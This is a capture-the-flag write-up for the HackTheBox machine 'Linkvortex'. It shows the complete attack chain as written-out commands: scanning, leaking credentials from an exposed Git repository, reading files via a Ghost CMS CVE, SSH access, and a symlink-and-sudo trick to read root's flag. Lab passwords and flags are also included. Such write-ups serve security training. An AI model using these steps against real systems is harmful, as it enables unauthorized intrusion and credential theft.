# 🎯 Linkvortex - HTB Machine
**Category:** Miscellaneous  
**Difficulty:** Medium  
**Platform:** HackTheBox  
**Release Date:** 2023  
**Target IP:** 10.10.11.47

## 📝 Challenge Description
A Ghost CMS instance with potential security misconfigurations and vulnerabilities that could lead to unauthorized access.

## 🔍 Reconnaissance

### Port Scanning
```bash
# Full TCP port scan
nmap -sC -sV -T4 -p- 10.10.11.47
```

**Results:**
| Port | State | Service | Version |
|------|--------|---------|----------|
| 22/tcp | Open | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 |
| 80/tcp | Open | HTTP | Apache httpd |

**Additional Details:**
- HTTP server redirects to `http://linkvortex.htb/`
- SSH host keys:
  - ECDSA: `256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb`
  - ED25519: `256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13`

### Web Enumeration

1. **Directory Enumeration (Main Domain)**
```bash
gobuster dir -u http://linkvortex.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

2. **Subdomain Enumeration**
```bash
ffuf -u http://linkvortex.htb/ -w /usr/share/wordlists/Custom/DNS/n0kovo_subdomains_huge.txt \
     -H "Host:FUZZ.linkvortex.htb" -mc 200 -fs 178 -o dnsresults -of md -v
```

**Discovered Subdomains:**
| Subdomain | Status | Content Length | Type |
|-----------|--------|----------------|------|
| dev | 200 | 2538 | text/html |

3. **Git Repository Enumeration (`dev.linkvortex.htb`)**
```bash
gobuster dir -u http://dev.linkvortex.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Exposed Git Files:**
| Path | Status | Size |
|------|--------|------|
| /.git/ | 301 | 239 |
| /.git/HEAD | 200 | 41 |
| /.git/config | 200 | 201 |
| /.git/logs/ | 200 | 868 |
| /.git/index | 200 | 707577 |

### Source Code Analysis

1. **Git Repository Investigation:**
```bash
git status
```
**Output:**
```
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        new file:   Dockerfile.ghost
        modified:   ghost/core/test/regression/api/admin/authentication.test.js
```

```bash
git diff --cached
```
**Output:**
```diff
diff --git a/Dockerfile.ghost b/Dockerfile.ghost
new file mode 100644
index 0000000..50864e0
--- /dev/null
+++ b/Dockerfile.ghost
@@ -0,0 +1,16 @@
+FROM ghost:5.58.0
+
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
+
+# Prevent installing packages
+RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
+
+# Wait for the db to be ready first
+COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
+COPY entry.sh /entry.sh
+RUN chmod +x /var/lib/ghost/wait-for-it.sh
+RUN chmod +x /entry.sh
+
+ENTRYPOINT ["/entry.sh"]
+CMD ["node", "current/index.js"]

diff --git a/ghost/core/test/regression/api/admin/authentication.test.js b/ghost/core/test/regression/api/admin/authentication.test.js
index 2735588..e654b0e 100644
--- a/ghost/core/test/regression/api/admin/authentication.test.js
+++ b/ghost/core/test/regression/api/admin/authentication.test.js
@@ -53,7 +53,7 @@ describe('Authentication API', function () {
 
         it('complete setup', async function () {
             const email = 'test@example.com';
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';
 
             const requestMock = nock('https://api.github.com')
                 .get('/repos/tryghost/dawn/zipball')
```

2. **Critical Findings:**
- Ghost CMS version 5.58.0 identified in Dockerfile
- Exposed credentials in test file:
  - Email: `test@example.com`
  - Password: `OctopiFociPilfer45`
- Configuration files referenced in Dockerfile that might contain sensitive data

3. **Login Portal Analysis:**
- Ghost CMS login portal vulnerable to username enumeration
- **Critical Finding:** Discovered valid admin email `admin@linkvortex.htb`
- This email combined with previously discovered credentials enabled initial access

## 🔓 Initial Access

### Ghost CMS Exploitation
- **Vulnerability:** CVE-2023-40028 (Ghost CMS v5.58)
- **Exploit Tool:**
  ```bash
  ./cve-2023-40028 -u <username> -p <password> -h <host_url>
  ```

### Configuration File Extraction
- **Target File:** `/var/lib/ghost/config.production.json`
- **Retrieved Configuration:**
```json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "SMTP",
    "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
      }
    }
  },
  "spam": {
    "user_login": {
      "minWait": 1,
      "maxWait": 604800000,
      "freeRetries": 5000
    }
  }
}
```

### SSH Access
- Successfully authenticated as user `bob` using discovered credentials
- User flag obtained

## 🔐 Privilege Escalation

### Sudo Permissions Analysis
```bash
sudo -l
```
**Output:**
```
User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

### Root Flag Extraction
1. **Symlink Creation:**
```bash
ln -s /root/root.txt /home/bob/test.txt
ln -s /home/bob/test.txt /home/bob/test.png
```

2. **Exploit Execution:**
```bash
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/test.png
```

## 🏁 Flags
- **User Flag:** `e9e77193e25870661af3813cab24a91c`
- **Root Flag:** `cdf8ecab5aace4312e2b04673c4fe73d`

## 💡 Key Takeaways
1. Always check for exposed Git repositories and analyze their contents
2. Version-specific vulnerabilities in CMS systems can be critical (Ghost CMS 5.58)
3. Configuration files often contain valuable credentials
4. Symlink attacks can be effective for privilege escalation when combined with sudo permissions

## 🛠️ Tools Used
- nmap
- gobuster
- ffuf
- git
- CVE-2023-40028 exploit
- Basic Linux commands (ln, sudo)

## 📚 References
- [Ghost CMS CVE-2023-40028](https://nvd.nist.gov/vuln/detail/CVE-2023-40028)
- [Ghost CMS Documentation](https://ghost.org/docs/)
